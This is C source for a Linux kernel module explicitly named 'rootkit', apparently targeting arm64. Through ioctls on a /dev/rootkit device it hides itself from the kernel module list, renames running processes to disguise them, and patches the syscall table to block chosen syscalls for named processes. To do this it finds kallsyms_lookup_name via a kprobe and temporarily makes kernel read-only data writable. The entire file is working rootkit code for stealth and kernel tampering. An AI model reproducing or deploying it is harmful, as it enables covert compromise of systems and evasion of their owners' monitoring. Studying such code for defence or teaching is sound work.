#include "rootkit.h"

#include <asm/syscall.h>
#include <linux/cdev.h>
#include <linux/dirent.h>
#include <linux/fs.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/reboot.h>
#include <linux/sched.h>
#include <linux/sched/signal.h>
#include <linux/slab.h>
#include <linux/syscalls.h>
#include <linux/uaccess.h>
#include <linux/version.h>

#define OURMODNAME "rootkit"

// store original syscall handler with type sys_call_t
typedef asmlinkage long (*sys_call_t)(const struct pt_regs *);

MODULE_AUTHOR("FOOBAR");
MODULE_DESCRIPTION("FOOBAR");
MODULE_LICENSE("Dual MIT/GPL");
MODULE_VERSION("0.1");

static int rootkit_open(struct inode *inode, struct file *filp) {
    printk(KERN_INFO "%s\n", __func__);
    return 0;
}

static int rootkit_release(struct inode *inode, struct file *filp) {
    printk(KERN_INFO "%s\n", __func__);
    return 0;
}

static unsigned long start_rodata;
static unsigned long init_begin;
static unsigned long section_size;

typedef void (*update_mapping_prot_t)(phys_addr_t phys, unsigned long virt, phys_addr_t size, pgprot_t prot);
static update_mapping_prot_t update_mapping_prot_ptr;
static syscall_fn_t *sys_call_table_ptr;

static void make_rodata_writable(void) {
    update_mapping_prot_ptr(__pa(start_rodata), start_rodata, section_size, PAGE_KERNEL);
    pr_info("rootkit: .rodata writable\n");
}

static void make_rodata_readonly(void) {
    update_mapping_prot_ptr(__pa(start_rodata), start_rodata, section_size, PAGE_KERNEL_RO);
    pr_info("rootkit: .rodata readonly\n");
}

static sys_call_t original_sys_call[__NR_syscalls];
static sys_call_t hooked_sys_call[__NR_syscalls];

struct filter_list_item {
    struct filter_info filter;
    struct list_head list;
};
static LIST_HEAD(filter_list_head);

static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
                          unsigned long arg) {
    static bool module_is_hidden = false;
    static struct list_head *prev_module;

    static struct masq_proc_req req;
    static struct masq_proc *proc_list;
    static struct task_struct *task;

    static struct filter_info user_filter;
    static struct filter_list_item *new_filter, *filter_entry, *tmp;
    
    long ret = 0;

    printk(KERN_INFO "%s\n", __func__);

    switch (ioctl) {
    case IOCTL_MOD_HIDE:
        if (module_is_hidden) {
            list_add(&THIS_MODULE->list, prev_module);
            module_is_hidden = false;
            pr_info("rootkit: visible\n");
        } else {
            prev_module = THIS_MODULE->list.prev;
            list_del(&THIS_MODULE->list);
            module_is_hidden = true;
            pr_info("rootkit: hidden\n");
        }
        break;
    case IOCTL_MOD_MASQ:
        if (copy_from_user(&req, (void*)arg, sizeof(struct masq_proc_req))) {
            pr_err("rootkit: copy_from_user failed\n");
            ret = -EFAULT;
            break;
        }

        proc_list = kmalloc(sizeof(struct masq_proc) * req.len, GFP_KERNEL);
        if (!proc_list) {
            pr_err("rootkit: kmalloc failed\n");
            ret = -ENOMEM;
            break;
        }

        if (copy_from_user(proc_list, req.list, sizeof(struct masq_proc) * req.len)) {
            pr_err("rootkit: copy_from_user failed\n");
            ret = -EFAULT;
            break;
        }

        for (int i = 0; i < req.len; i++) {
            for_each_process(task) {
                if (strncmp(task->comm, proc_list[i].orig_name, MASQ_LEN) == 0) {
                    size_t original_name_len = strlen(task->comm);
                    size_t new_name_len = strlen(proc_list[i].new_name);
                    if (new_name_len < original_name_len) {
                        strscpy(task->comm, proc_list[i].new_name, TASK_COMM_LEN);
                        pr_info("rootkit: renamed '%s' to '%s'\n", proc_list[i].orig_name, proc_list[i].new_name);
                    }
                }
            }
        }

        pr_info("rootkit: masq\n");
        kfree(proc_list);
        break;
    case IOCTL_ADD_FILTER:
        if (copy_from_user(&user_filter, (void*)arg, sizeof(struct filter_info))) {
            pr_err("rootkit: copy_from_user failed\n");
            ret = -EFAULT;
            break;
        }

        new_filter = kmalloc(sizeof(struct filter_list_item), GFP_KERNEL);
        if (!new_filter) {
            pr_err("rootkit: kmalloc failed\n");
            ret = -ENOMEM;
            break;
        }

        make_rodata_writable();
        sys_call_table_ptr[user_filter.syscall_nr] = hooked_sys_call[user_filter.syscall_nr];
        make_rodata_readonly();

        memcpy(&new_filter->filter, &user_filter, sizeof(struct filter_info));
        list_add_tail(&new_filter->list, &filter_list_head);

        pr_info("rootkit: added filter for syscall %d, process '%s'\n", user_filter.syscall_nr, user_filter.comm);
        break;
    case IOCTL_REMOVE_FILTER:
        if (copy_from_user(&user_filter, (void*)arg, sizeof(struct filter_info))) {
            pr_err("rootkit: copy_from_user failed\n");
            ret = -EFAULT;
            break;
        }

        list_for_each_entry_safe(filter_entry, tmp, &filter_list_head, list) {
            if (filter_entry->filter.syscall_nr == user_filter.syscall_nr && strncmp(filter_entry->filter.comm, user_filter.comm, TASK_FILTER_LEN) == 0) {
                list_del(&filter_entry->list);
                kfree(filter_entry);
                pr_info("rootkit: removed filter for syscall %d, process '%s'\n", user_filter.syscall_nr, user_filter.comm);
            }
        }

        break;
    default:
        ret = -EINVAL;
    }

    return ret;
}

static int major;
static struct class *cls;

struct file_operations fops = {
    open : rootkit_open,
    unlocked_ioctl : rootkit_ioctl,
    release : rootkit_release,
    owner : THIS_MODULE
};

#define HOOKED_SYSCALL(nr, sym)                                                                                                \
static long hooked_##sym(const struct pt_regs *regs) {                                                                         \
    struct filter_list_item *filter_entry;                                                                                     \
    char current_comm[TASK_COMM_LEN];                                                                                          \
                                                                                                                               \
    get_task_comm(current_comm, current);                                                                                      \
    list_for_each_entry(filter_entry, &filter_list_head, list) {                                                               \
        if (filter_entry->filter.syscall_nr == nr && strncmp(current_comm, filter_entry->filter.comm, TASK_FILTER_LEN) == 0) { \
            pr_info("rootkit: blocking syscall %s for process '%s'\n", #sym, current_comm);                                    \
            return -EPERM;                                                                                                     \
        }                                                                                                                      \
    }                                                                                                                          \
                                                                                                                               \
    return original_sys_call[nr](regs);                                                                                        \
}

#undef __SYSCALL
#define __SYSCALL(nr, sym) HOOKED_SYSCALL(nr, sym);
#include <asm/unistd.h>

static int __init rootkit_init(void) {
    struct kprobe kp = {
        .symbol_name = "kallsyms_lookup_name",
    };

    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
    kallsyms_lookup_name_t kallsyms_lookup_name_ptr;

    major = register_chrdev(0, OURMODNAME, &fops);
    if (major < 0) {
        pr_err("Registering char device failed with %d\n", major);
        return major;
    }

    pr_info("The module was assigned major number %d.\n", major);
    cls = class_create(THIS_MODULE, OURMODNAME);
    device_create(cls, NULL, MKDEV(major, 0), NULL, OURMODNAME);
    pr_info("Device created on /dev/%s\n", OURMODNAME);

    if (register_kprobe(&kp) < 0) {
        pr_err("rootkit: register_kprobe failed\n");
        return -EIO;
    }
    kallsyms_lookup_name_ptr = (kallsyms_lookup_name_t)kp.addr;
    pr_info("rootkit: kallsyms_lookup_name: 0x%p\n", kp.addr);
    unregister_kprobe(&kp);

    start_rodata = kallsyms_lookup_name_ptr("__start_rodata");
    init_begin = kallsyms_lookup_name_ptr("__init_begin");
    section_size = init_begin - start_rodata;
    pr_info("rootkit: __start_rodata @ 0x%p\n", (void*)start_rodata);
    pr_info("rootkit: __init_begin @ 0x%p\n", (void*)init_begin);

    update_mapping_prot_ptr = (update_mapping_prot_t)kallsyms_lookup_name_ptr("update_mapping_prot");
    if (!update_mapping_prot_ptr) {
        pr_err("rootkit: kallsyms_lookup_name failed\n");
        return -EIO;
    }
    pr_info("rootkit: update_mapping_prot @ 0x%p\n", update_mapping_prot_ptr);

    sys_call_table_ptr = (syscall_fn_t*)kallsyms_lookup_name_ptr("sys_call_table");
    if (!sys_call_table_ptr) {
        pr_err("rootkit: kallsyms_lookup_name failed\n");
        return -EIO;
    }
    pr_info("rootkit: sys_call_table @ 0x%p\n", sys_call_table_ptr);

    #undef __SYSCALL
    #define __SYSCALL(nr, sym) \
        original_sys_call[nr] = sys_call_table_ptr[nr]; \
        hooked_sys_call[nr] = hooked_##sym;
    #include <asm/unistd.h>

    return 0;
}

static void __exit rootkit_exit(void) {
    struct filter_list_item *filter_entry, *tmp;

    make_rodata_writable();
    #undef __SYSCALL
    #define __SYSCALL(nr, sym) \
        if (sys_call_table_ptr[nr] != original_sys_call[nr]) \
            sys_call_table_ptr[nr] = original_sys_call[nr];
    #include <asm/unistd.h>
    make_rodata_readonly();

    list_for_each_entry_safe(filter_entry, tmp, &filter_list_head, list) {
        list_del(&filter_entry->list);
        kfree(filter_entry);
    }

    pr_info("%s: removed\n", OURMODNAME);
    device_destroy(cls, MKDEV(major, 0));
    class_destroy(cls);
    unregister_chrdev(major, OURMODNAME);
}

module_init(rootkit_init);
module_exit(rootkit_exit);
